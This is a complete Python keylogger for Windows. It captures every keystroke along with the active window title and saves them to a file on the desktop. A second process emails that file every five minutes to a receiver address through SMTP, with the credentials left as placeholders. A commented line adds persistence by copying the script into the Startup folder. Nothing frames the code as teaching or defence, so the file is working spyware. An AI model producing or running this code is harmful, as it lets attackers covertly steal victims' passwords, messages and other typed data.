import ctypes
import logging  # for writing the recorded keys
import os
import time
from shutil import copyfile
import smtplib  # for sending emails
from email.message import EmailMessage
from multiprocessing import Process
import win32api
import win32event
import win32gui
import winerror
from pynput.keyboard import Listener  # for recording the keyboard

username = os.getlogin()  # get the user name of the current system
filename = f"C:/Users/{username}/Desktop/logdata.txt"


# if you want to run this script on startup:
# copyfile('keylogger.py', f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")


def send_log():
    msg = EmailMessage()
    msg["From"] = """SENDER'S EMAIL"""
    msg["Subject"] = "Subject"
    msg["To"] = """RECEIVER'S EMAIL"""
    msg.set_content(f"Log data of {username}")
    server = smtplib.SMTP('SMTP Address of the server', 587)
    while True:
        msg.add_attachment(open(filename, "r").read(), filename="logdata.txt")
        server.login('USERNAME', 'PASSWORD')
        server.ehlo()
        server.send_message(msg)
        # print('message sent')
        time.sleep(300)  # sending the log file every 5 minutes.


def on_press(key):
    window_name = ''
    try:
        # getting the current active window
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        curr_window = user32.GetForegroundWindow()
        event_window_name = win32gui.GetWindowText(curr_window)
        if window_name != event_window_name:
            window_name = event_window_name
        logging.info(f"{key}    window: {window_name}")  # logging data
    except:
        pass


def start_logging():
    # print('logging started..')
    logging.basicConfig(filename=filename, level=logging.DEBUG, format="%(asctime)s %(message)s")
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == '__main__':
    # to disallow multiple instance of the program
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy_main')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        print("Multiple instances are not allowed")
        exit(0)
    # starting both functions concurrently
    p1 = Process(target=start_logging)
    p2 = Process(target=send_log)
    p1.start()
    p2.start()
